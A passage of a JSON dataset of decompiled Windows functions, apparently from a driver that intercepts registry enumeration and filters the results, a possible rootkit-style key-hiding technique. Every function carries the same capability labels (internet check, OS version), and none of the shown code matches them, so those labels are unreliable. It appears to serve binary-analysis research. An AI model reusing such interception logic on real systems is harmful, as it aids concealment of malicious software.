        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0001baf0(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    uVar1 = (**0x800510c8)();\n    _auStack8 = uVar1 << 0x18;\n    if (arg_8h == uVar1) {\n        uVar3 = CONCAT31(arg_8h >> 7, uVar1);\n    }\n    else {\n        while (iVar2 = fcn.000533b0(0x800ce398, 1, 0),  iVar2 != 0) {\n            _auStack8 = 0;\n            fcn.00043cb0(0);\n        }\n        if (arg_8h == 0) {\n            if (*0x800ce390 != NULL) {\n                (**0x800ce390)();\n            }\n        }\n        else if ((arg_8h == 1) && (*0x800ce394 != NULL)) {\n            (**0x800ce394)();\n        }\n        uVar3 = fcn.00037420(0x800ce398);\n        uVar3 = uVar3 & 0xffffff00 | _auStack8 >> 0x18;\n    }\n    return uVar3;\n}\n",
        "token_count": 317
    },
    "0001bb70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001bb70(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.000349b0(0x800ccdf0);\n    fcn.000349b0(0x800cccc0);\n    *0x800cccc4 = fcn.000357b0(100, 4);\n    if (*0x800cccc4 == 0) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        iVar1 = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800516cc, 0x8005c040, 0x800ce3a4);\n        if (iVar1 == 0) {\n            fcn.00063fd0(*0x800ce3a4);\n            iVar1 = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800516d8, 0x8005c2a0, 0x800ce3a8);\n            if (iVar1 == 0) {\n                fcn.00063fd0(*0x800ce3a8);\n                iVar1 = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800516e8, 0x8005c480, 0x800ce3ac);\n                if (iVar1 == 0) {\n                    fcn.00063fd0(*0x800ce3ac);\n                    iVar1 = fcn.000635c0(1, *(*0x800cc770 + 0xc), 0x800516f4, 0x8005c570, 0x800ce3b0);\n                    if (iVar1 == 0) {\n                        fcn.00063fd0(*0x800ce3b0);\n                        fcn.00071080(0x800ce3b4, 1);\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 453
    },
    "0001bca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001bca0(void)\n\n{\n    int32_t iVar1;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.00063fd0(*0x800ce3b0);\n    fcn.00063b20(0x800ce3b0);\n    fcn.00063fd0(*0x800ce3ac);\n    fcn.00063b20(0x800ce3ac);\n    fcn.00063fd0(*0x800ce3a8);\n    fcn.00063b20(0x800ce3a8);\n    fcn.00063fd0(*0x800ce3a4);\n    fcn.00063b20(0x800ce3a4);\n    iVar1 = fcn.000533b0(0x800ce3b4, 0, 1);\n    if (iVar1 != 0) {\n        while (iVar1 = fcn.000533b0(0x800ce3b8, 0, 0),  iVar1 != 0) {\n            fcn.00043cb0(1);\n        }\n        fcn.00034a10(0x800ccdf0);\n        for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n            if (*(*0x800cccc4 + var_4h * 4) != 0) {\n                iVar1 = *(*0x800cccc4 + var_4h * 4);\n                for (var_ch = 0; var_ch < 100; var_ch = var_ch + 1) {\n                    fcn.000357f0(*(iVar1 + 0x14 + var_ch * 0x20));\n                }\n                fcn.000357f0(iVar1);\n            }\n        }\n        fcn.000357f0(*0x800cccc4);\n        fcn.00034a80(0x800ccdf0);\n        fcn.000349e0(0x800ccdf0);\n        fcn.00034a10(0x800cccc0);\n        fcn.00078bfa(0x800cccc8, 0, 0x80);\n        fcn.00034a80(0x800cccc0);\n        fcn.000349e0(0x800cccc0);\n    }\n    return;\n}\n",
        "token_count": 543
    },
    "0001be10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0001be10(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint *puVar3;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_15h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_15h._0_1_ = 0;\n    if (arg_8h == 0) {\n        uVar2 = in_EAX & 0xffffff00;\n    }\n    else {\n        fcn.00037400(0x800ce3b8);\n        iVar1 = fcn.000533b0(0x800ce3b4, 0, 0);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00037420(0x800ce3b8);\n            uVar2 = uVar2 & 0xffffff00;\n        }\n        else {\n            var_ch = fcn.0005a620();\n            uVar2 = extraout_ECX;\n            if (arg_ch != '\\0') {\n                fcn.00034a10(0x800cccc0);\n                for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n                    if ((*(var_4h * 8 + -0x7ff33338) == arg_8h) &&\n                       ((*(var_4h * 8 + -0x7ff33334) == var_ch || (arg_8h < 0)))) {\n                        *(var_4h * 8 + -0x7ff33338) = 0;\n                        *(var_4h * 8 + -0x7ff33334) = 0;\n                        break;\n                    }\n                }\n                fcn.00034a80(0x800cccc0);\n                uVar2 = extraout_ECX_00;\n                if (var_4h < 0x10) {\n                    var_15h._0_1_ = 1;\n                }\n            }\n            if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n                var_20h = 0;\n            }\n            else {\n                var_20h = 1;\n            }\n            iVar1 = (**0x8005129c)(arg_8h, 0, 0, uVar2 & 0xffffff00 | var_20h, &var_10h, 0);\n            if (iVar1 == 0) {\n                *0x8 = (var_10h >> 8 ^ var_10h ^ var_10h >> 0x10 ^ var_10h >> 0x18) % 100;\n                (**0x800512e0)();\n            }\n            else {\n                stack0xffffffe8 = 0;\n                var_10h = 0;\n            }\n            if (var_10h == 0) {\n                uVar2 = fcn.00037420(0x800ce3b8);\n                uVar2 = uVar2 & 0xffffff00 | var_15h;\n            }\n            else {\n                fcn.00034a10(0x800ccdf0);\n                if (((arg_ch == '\\0') || (*(var_10h - 0x14) == 1)) &&\n                   (var_8h = *(*0x800cccc4 + stack0xffffffe8 * 4),  var_8h != 0)) {\n                    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n                        if (*(var_8h + 4 + var_4h * 0x20) == var_10h) {\n                            fcn.000357f0(*(var_8h + 0x14 + var_4h * 0x20));\n                            puVar3 = var_4h * 0x20 + var_8h;\n                            *puVar3 = 0;\n                            puVar3[1] = 0;\n                            puVar3[2] = 0;\n                            puVar3[3] = 0;\n                            puVar3[4] = 0;\n                            puVar3[5] = 0;\n                            puVar3[6] = 0;\n                            puVar3[7] = 0;\n                            break;\n                        }\n                    }\n                }\n                fcn.00034a80(0x800ccdf0);\n                uVar2 = fcn.00037420(0x800ce3b8);\n                uVar2 = uVar2 & 0xffffff00 | var_15h;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1145
    },
    "0001c040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nint32_t __cdecl fcn.0001c040(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_28h = 0;\n    var_18h = 0;\n    uVar5 = arg_ch;\n    iVar3 = arg_10h;\n    iVar4 = arg_14h;\n    pcVar2 = fcn.00063f30(arg_8h);\n    iVar3 = (*pcVar2)(arg_8h, uVar5, iVar3, iVar4, arg_18h, arg_1ch);\n    if ((((arg_10h == 2) || (arg_10h == 4)) && (cVar1 = fcn.0001fa30(),  cVar1 == '\\0')) &&\n       ((iVar3 == 0 || (iVar3 == -0x7ffffffb)))) {\n        if (arg_10h == 2) {\n            var_14h = arg_14h;\n            var_8h = *(arg_14h + 0x14);\n        }\n        else {\n            var_28h = arg_14h;\n            var_8h = *(arg_14h + 0xc);\n        }\n        var_24h = fcn.000357b0(4, var_8h);\n        if (var_24h == 0) {\n            var_1ch = -0x3fffff66;\n        }\n        else {\n            var_18h = fcn.000356c0(0x402);\n            if (var_18h == 0) {\n                var_1ch = -0x3fffff66;\n            }\n            else {\n                var_1ch = fcn.00034f60(arg_ch, &var_4h);\n                if (var_1ch == 0) {\n                    var_ch = 0;\n                    var_10h = 0;\n                    while (((var_ch < var_8h &&\n                            (iVar4 = fcn.00078a86(arg_8h, var_ch, 0, var_18h, 0x400, 0x800ccdec, var_4h), \n                            iVar4 != -0x7fffffe6)) && ((iVar4 == 0 || (iVar4 == -0x7ffffffb))))) {\n                        if (iVar4 == 0) {\n                            *(var_18h + 0x10 + (*(var_18h + 0xc) & 0xfffffffe)) = 0;\n                        }\n                        else {\n                            *(var_18h + 0x400) = 0;\n                        }\n                        cVar1 = fcn.0001cec0(var_18h + 0x10);\n                        if (cVar1 == '\\0') {\n                            *(var_24h + var_10h * 4) = var_ch;\n                            var_10h = var_10h + 1;\n                        }\n                        var_ch = var_ch + 1;\n                    }\n                    fcn.00034fb0(arg_ch, var_4h);\n                    if (var_8h == var_10h) {\n                        fcn.000357f0(var_24h);\n                        var_24h = 0;\n                    }\n                    cVar1 = fcn.0001c9b0(arg_ch, var_24h, var_10h, var_8h);\n                    if (cVar1 != '\\0') {\n                        var_24h = 0;\n                    }\n                    if (arg_10h == 2) {\n                        *(var_14h + 0x14) = var_10h;\n                    }\n                    else {\n                        *(var_28h + 0xc) = var_10h;\n                    }\n                    var_1ch = 0;\n                }\n            }\n        }\n        fcn.000357f0(var_18h);\n        fcn.000357f0(var_24h);\n        if (var_1ch != 0) {\n            iVar3 = var_1ch;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1055
    },
    "0001c2a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001c2a0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    cVar1 = fcn.0001fa30();\n    if ((cVar1 != '\\0') || (arg_20h == -0x7ff33214)) {\n        pcVar2 = fcn.00063f30(arg_8h);\n        iVar3 = (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        return iVar3;\n    }\n    *0x800ce39c = *0x800ce39c + 1;\n    cVar1 = fcn.0001cc40(arg_ch, arg_10h, &var_ch);\n    if (cVar1 != '\\0') {\n        *0x800ce3a0 = *0x800ce3a0 + 1;\n        pcVar2 = fcn.00063f30(arg_8h);\n        iVar3 = (*pcVar2)(arg_8h, arg_ch, var_ch, arg_14h, arg_18h, arg_1ch, arg_20h);\n        return iVar3;\n    }\n    iVar3 = fcn.000356c0(0x402);\n    if (iVar3 == 0) {\n        return -0x3fffff66;\n    }\n    var_14h = fcn.00034f60(arg_ch, &var_4h);\n    if (var_14h == 0) {\n        var_8h = 0;\n        var_ch = 0;\n        do {\n            var_14h = fcn.00078a86();\n            if ((var_14h != 0) && (var_14h != -0x7ffffffb)) goto code_r0x0001c424;\n            if (var_14h == 0) {\n                *(iVar3 + 0x10 + (*(iVar3 + 0xc) & 0xfffffffe)) = 0;\n            }\n            else {\n                *(iVar3 + 0x400) = 0;\n            }\n            cVar1 = fcn.0001cec0(iVar3 + 0x10);\n            if (cVar1 == '\\0') {\n                if (var_ch == arg_10h) goto code_r0x0001c40d;\n                var_ch = var_ch + 1;\n            }\n            var_8h = var_8h + 1;\n        } while( true );\n    }\ncode_r0x0001c431:\n    fcn.000357f0(iVar3);\n    if (var_14h == 0) {\n        iVar3 = var_8h;\n        pcVar2 = fcn.00063f30(arg_8h);\n        var_14h = (*pcVar2)(arg_8h, arg_ch, iVar3, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return var_14h;\ncode_r0x0001c40d:\n    var_14h = 0;\ncode_r0x0001c424:\n    fcn.00034fb0(arg_ch, var_4h);\n    goto code_r0x0001c431;\n}\n",
        "token_count": 830
    },
    "0001c480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001c480(uint param_1, uint param_2, uint param_3, int32_t param_4, uint param_5, uint param_6, uint param_7\n                    , int32_t *param_8)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_18h;\n    uint var_18h_2;\n    uint var_1ch;\n    uint var_20h;\n    int32_t *var_24h;\n    int32_t *piVar4;\n    uint var_20h_2;\n    int32_t var_1ch_2;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d10;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    iVar3 = var_18h;\n    piVar4 = var_24h;\n    pcVar2 = fcn.00063f30(var_8h);\n    iVar3 = (*pcVar2)(var_8h, var_ch, var_10h, iVar3, var_18h_2, var_1ch, var_20h, piVar4);\n    if (iVar3 == 0) {\n        if (var_24h == NULL) {\n            var_1ch_2 = 1;\n        }\n        else {\n            cVar1 = (**0x800510c8)();\n            if (cVar1 == '\\0') {\n                var_1ch_2 = *var_24h;\n            }\n            else {\n                var_4h = 0;\n                (**0x800512dc)(var_24h, 4, 1);\n                var_1ch_2 = *var_24h;\n                var_4h = 0xffffffff;\n            }\n        }\n        if (var_1ch_2 == 1) {\n            fcn.0001be10(*(var_18h + 4), 0);\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return iVar3;\n}\n",
        "token_count": 545
    },
    "0001c570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001c570(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    char cVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    ushort auStack1228 [2];\n    uint var_4c4h;\n    int32_t var_2c4h;\n    uint var_2c0h;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    int32_t var_2ach;\n    uint var_2a8h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint *var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_82h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar4 = arg_10h;\n    pcVar3 = fcn.00063f30(arg_8h);\n    var_2c4h = (*pcVar3)(arg_8h, arg_ch, uVar4);\n    if ((var_2c4h == 0) && (cVar2 = (**0x800510c8)(),  cVar2 != '\\x01')) {\n        var_2c4h = (**0x8005129c)(arg_10h, 0x80000000, **0x80051108, 0, &var_2ach, 0);\n        if (var_2c4h == 0) {\n            var_1h._0_1_ = '\\0';\n            var_2b4h._0_2_ = 0x43;\n            while ((var_2b4h < 0x5b && (var_1h == '\\0'))) {\n                fcn.00078a20(&var_4d0h, 0x80051700, var_2b4h);\n                fcn.000789c0(&var_2a8h, &var_4d0h);\n                var_2c4h = (**0x800512ec)(&var_2a8h, 0, &var_8h, &var_2b8h);\n                if (var_2c4h == 0) {\n                    if (*(var_2ach + 4) == *(var_8h + 4)) {\n                        var_1h._0_1_ = '\\x01';\n                    }\n                    (**0x800512e0)();\n                }\n                var_2b4h._0_2_ = var_2b4h + 1;\n            }\n            if ((var_1h != '\\0') && (*(var_2ach + 0x30) < 499)) {\n                fcn.00078be8(&var_4c4h, *(var_2ach + 0x34), *(var_2ach + 0x30));\n                *(&var_4d0h + (*(var_2ach + 0x30) + 0xc & 0xfffffffe)) = 0;\n                fcn.000789b4(arg_10h);\n                var_2b0h = fcn.0005a620();\n                fcn.00034a10(0x800cccc0);\n                for (var_7ch = 0; var_7ch < 0x10; var_7ch = var_7ch + 1) {\n                    if (*(var_7ch * 8 + -0x7ff33338) == 0) {\n                        *(var_7ch * 8 + -0x7ff33338) = arg_10h;\n                        *(var_7ch * 8 + -0x7ff33334) = var_2b0h;\n                        break;\n                    }\n                }\n                if (0xf < var_7ch) {\n                    fcn.000789fc(0x800cccc8, 0x800cccd0, 0x78);\n                    *0x800ccd40 = arg_10h;\n                    *0x800ccd44 = var_2b0h;\n                }\n                fcn.00034a80(0x800cccc0);\n                fcn.0002c030(&var_78h, 0x52);\n                fcn.000789c6(&var_288h, 0x104, 0x80051710, &var_78h);\n                var_82h._0_2_ = 0;\n                fcn.000789c0(&var_2a8h, &var_288h);\n                var_20h = 0x18;\n                var_1ch = 0;\n                var_14h = 0x140;\n                var_18h = &var_2a8h;\n                var_10h = 0;\n                var_ch = 0;\n                fcn.000789c0(&var_2c0h, &var_4d0h);\n                var_2a0h = 0x18;\n                var_29ch = 0;\n                var_294h = 0x40;\n                var_298h = &var_2c0h;\n                var_290h = 0;\n                var_28ch = 0;\n                var_2c4h = fcn.00078a80(&var_20h, &var_2a0h);\n                if (var_2c4h == 0) {\n                    var_2c4h = fcn.000789ba(&var_4d4h, 0xf003f, &var_20h);\n                    if (var_2c4h == 0) {\n                        fcn.0001cfb0(var_4d4h, &var_288h, 0, 4);\n                        fcn.000789b4(var_4d4h);\n                    }\n                    fcn.00078a7a(&var_20h);\n                    puVar1 = &var_4d4h + 2;\n                    do {\n                        var_4d8h = puVar1;\n                        puVar1 = var_4d8h + 2;\n                    } while (*(var_4d8h + 2) != 0);\n                    *(var_4d8h + 2) = *0x80051748;\n                    *(var_4d8h + 6) = *0x8005174c;\n                    *(var_4d8h + 10) = *0x80051750;\n                    fcn.000789c0(&var_2c0h, &var_4d0h);\n                    var_2a0h = 0x18;\n                    var_29ch = 0;\n                    var_294h = 0x40;\n                    var_298h = &var_2c0h;\n                    var_290h = 0;\n                    var_28ch = 0;\n                    fcn.000789d8(&var_2a0h);\n                }\n            }\n            (**0x800512e0)();\n            var_2c4h = 0;\n        }\n        else {\n            var_2c4h = 0;\n        }\n    }\n    return var_2c4h;\n}\n",
        "token_count": 1735
    },
    "0001c9b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001c9b0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_4h;\n    \n    fcn.00037400(0x800ce3b8);\n    iVar2 = fcn.000533b0(0x800ce3b4, 0, 0);\n    if (iVar2 == 0) {\n        fcn.00037420(0x800ce3b8);\n        uVar4 = 0;\n    }\n    else {\n        uVar3 = (**0x80051104)(&var_18h);\n        if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n            var_30h = 0;\n        }\n        else {\n            var_30h = 1;\n        }\n        iVar2 = (**0x8005129c)(arg_8h, 0, 0, uVar3 & 0xffffff00 | var_30h, &var_24h, 0);\n        if (iVar2 == 0) {\n            var_28h = (var_24h >> 8 ^ var_24h ^ var_24h >> 0x10 ^ var_24h >> 0x18) % 100;\n            (**0x800512e0)();\n        }\n        else {\n            var_28h = 0;\n            var_24h = 0;\n        }\n        if (var_24h == 0) {\n            fcn.00037420(0x800ce3b8);\n            uVar4 = 0;\n        }\n        else {\n            fcn.00034a10(0x800ccdf0);\n            if (*(*0x800cccc4 + var_28h * 4) == 0) {\n                uVar4 = fcn.000357b0(100, 0x20);\n                *(*0x800cccc4 + var_28h * 4) = uVar4;\n                if (*(*0x800cccc4 + var_28h * 4) == 0) {\n                    fcn.00034a80(0x800ccdf0);\n                    fcn.00037420(0x800ce3b8);\n                    return 0;\n                }\n            }\n            var_20h = *(*0x800cccc4 + var_28h * 4);\n            var_2ch = 0;\n            var_10h = 0;\n            var_ch = 0;\n            var_4h = -1;\n            for (var_1ch = 0; var_1ch < 100; var_1ch = var_1ch + 1) {\n                if (*(var_20h + 4 + var_1ch * 0x20) == 0) {\n                    var_4h = var_1ch;\n                    break;\n                }\n                puVar1 = var_20h + 8 + var_1ch * 0x20;\n                iVar2 = (var_14h - *(var_20h + 0xc + var_1ch * 0x20)) - (var_18h < *puVar1);\n                if ((var_ch <= iVar2) && ((var_ch < iVar2 || (var_10h < var_18h - *puVar1)))) {\n                    var_2ch = var_1ch;\n                    puVar1 = var_20h + 8 + var_1ch * 0x20;\n                    var_10h = var_18h - *puVar1;\n                    var_ch = (var_14h - *(var_20h + 0xc + var_1ch * 0x20)) - (var_18h < *puVar1);\n                }\n            }\n            if (var_4h != -1) {\n                var_2ch = var_4h;\n            }\n            fcn.000357f0(*(var_20h + 0x14 + var_2ch * 0x20));\n            *(var_20h + 4 + var_2ch * 0x20) = var_24h;\n            *(var_20h + 0x14 + var_2ch * 0x20) = arg_ch;\n            *(var_20h + 0x10 + var_2ch * 0x20) = arg_10h;\n            *(var_20h + 0x18 + var_2ch * 0x20) = arg_14h;\n            *(var_20h + 8 + var_2ch * 0x20) = var_18h;\n            *(var_20h + 0xc + var_2ch * 0x20) = var_14h;\n            fcn.00034a80(0x800ccdf0);\n            fcn.00037420(0x800ce3b8);\n            uVar4 = 1;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1261
    },
    "0001cc40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Removing unreachable block (ram,0x0001ce46)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0001cc40(uint32_t arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t extraout_ECX;\n    bool bVar6;\n    uint var_38h;\n    uint var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_5h._0_1_ = 0;\n    fcn.00037400(0x800ce3b8);\n    iVar4 = fcn.000533b0(0x800ce3b4, 0, 0);\n    if (iVar4 == 0) {\n        uVar5 = fcn.00037420(0x800ce3b8);\n        uVar5 = uVar5 & 0xffffff00;\n    }\n    else {\n        (**0x80051104)(&var_10h);\n        var_2ch = 0;\n        uVar5 = extraout_ECX;\n        while( true ) {\n            if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n                var_30h = 0;\n            }\n            else {\n                var_30h = 1;\n            }\n            iVar4 = (**0x8005129c)(arg_8h, 0, 0, uVar5 & 0xffffff00 | var_30h, &var_24h, 0);\n            if (iVar4 == 0) {\n                (**0x800512e0)(var_2ch, (var_24h >> 8 ^ var_24h ^ var_24h >> 0x10 ^ var_24h >> 0x18) % 100);\n            }\n            else {\n                var_24h = 0;\n            }\n            if (var_24h == 0) break;\n            fcn.00034a10(0x800ccdf0);\n            var_20h = *(*0x800cccc4 + 0x3337c0);\n            if (var_20h != 0) {\n                for (var_14h = 0; var_14h < 100; var_14h = var_14h + 1) {\n                    if (*(var_20h + 4 + var_14h * 0x20) == var_24h) {\n                        puVar1 = var_20h + 8 + var_14h * 0x20;\n                        piVar2 = var_20h + 0xc + var_14h * 0x20;\n                        uVar5 = var_10h < *puVar1;\n                        uVar3 = var_ch - *piVar2;\n                        bVar6 = uVar3 - uVar5 < 0;\n                        if ((bVar6) ||\n                           ((uVar3 == uVar5 || (SBORROW4(var_ch, *piVar2) != SBORROW4(uVar3, uVar5)) != bVar6 &&\n                            (var_10h - *puVar1 < 100000000)))) {\n                            if (arg_10h != NULL) {\n                                if (*(var_20h + 0x14 + var_14h * 0x20) == 0) {\n                                    *arg_10h = arg_ch;\n                                }\n                                else if (arg_ch < *(var_20h + 0x10 + var_14h * 0x20)) {\n                                    *arg_10h = *(*(var_20h + 0x14 + var_14h * 0x20) + arg_ch * 4);\n                                }\n                                else {\n                                    *arg_10h = *(var_20h + 0x18 + var_14h * 0x20);\n                                }\n                            }\n                            var_5h._0_1_ = 1;\n                        }\n                        else {\n                            fcn.00034a80(0x800ccdf0);\n                            fcn.0001be10(arg_8h, 0);\n                            fcn.00034a10(0x800ccdf0);\n                        }\n                        break;\n                    }\n                }\n            }\n            fcn.00034a80(0x800ccdf0);\n            if ((var_5h != 0) || (var_1ch = fcn.000356c0(0x402),  var_1ch == 0)) break;\n            iVar4 = fcn.00034f60(arg_8h, &var_5h + 1);\n            if (iVar4 == 0) {\n                fcn.00078a8c(stack0xfffffff8, 2, var_1ch, 0x400, &var_18h);\n                fcn.00034fb0(arg_8h, stack0xfffffff8);\n            }\n            fcn.000357f0(var_1ch);\n            uVar5 = 0x800ccdf1;\n            var_2ch = uVar5;\n        }\n        uVar5 = fcn.00037420(0x800ce3b8);\n        uVar5 = uVar5 & 0xffffff00 | var_5h;\n    }\n    return uVar5;\n}\n",
        "token_count": 1390
    },
    "0001cec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
